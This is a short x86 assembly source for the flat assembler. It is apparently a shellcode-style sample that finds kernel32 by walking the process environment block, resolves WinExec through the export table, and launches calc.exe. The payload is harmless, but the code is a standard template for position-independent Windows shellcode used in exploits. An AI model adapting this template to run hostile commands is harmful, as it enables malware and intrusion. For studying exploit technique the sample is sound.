; pop calc.exe using `WinExec` Windows api call
; i will document it very soon
; how to run:
; download fasm and compile the source code
; https://flatassembler.net/


format PE
use32
entry start

  start:
    push eax
    push ebx
    push ecx
    push edx
    push esi
    push edi
    push ebp
		push ebp
		mov ebp, esp
		sub esp, 18h
		xor esi, esi
		pushw si
		push 63h
		pushw 6578h
		push 456e6957h
		mov [ebp-4], esp	;"WinExec\x00"
		xor esi, esi
		mov ebx, [fs:30h + esi]
		mov ebx, [ebx + 0x0C]
		mov ebx, [ebx + 0x14]
		mov ebx, [ebx]
		mov ebx, [ebx]
		mov ebx, [ebx + 0x10]
		mov [ebp-8], ebx
		mov eax, [ebx + 3Ch]
		add eax, ebx
		mov eax, [eax + 78h]
		add eax, ebx
		mov ecx, [eax + 24h]
		add ecx, ebx
		mov [ebp-0Ch], ecx
		mov edi, [eax + 20h]
		add edi, ebx
		mov [ebp-10h], edi
		mov edx, [eax + 1Ch]
		add edx, ebx
		mov [ebp-14h], edx
		mov edx, [eax + 14h]
		xor eax, eax
		
		.loop:
			mov edi, [ebp-10h]
			mov esi, [ebp-4]
			xor ecx, ecx
			cld
			mov edi, [edi + eax*4]
			add edi, ebx
			add cx, 8
			repe cmpsb
			jz start.found
			inc eax
			cmp eax, edx
			jb start.loop
			add esp, 26h      		
			jmp start.end

		.found:
			mov ecx, [ebp-0Ch]
			mov edx, [ebp-14h]
			mov ax, [ecx + eax*2]
			mov eax, [edx + eax*4]
			add eax, ebx
			xor edx, edx
			push edx
			push 6578652eh
			push 636c6163h
			push 5c32336dh
			push 65747379h
			push 535c7377h
			push 6f646e69h
			push 575c3a43h
			mov esi, esp	; "C:\Windows\System32\calc.exe"
			push 10
			push esi
			call eax
			add esp, 46h

		.end:
			pop ebp
			pop edi
			pop esi
			pop edx
			pop ecx
			pop ebx
			pop eax
			ret
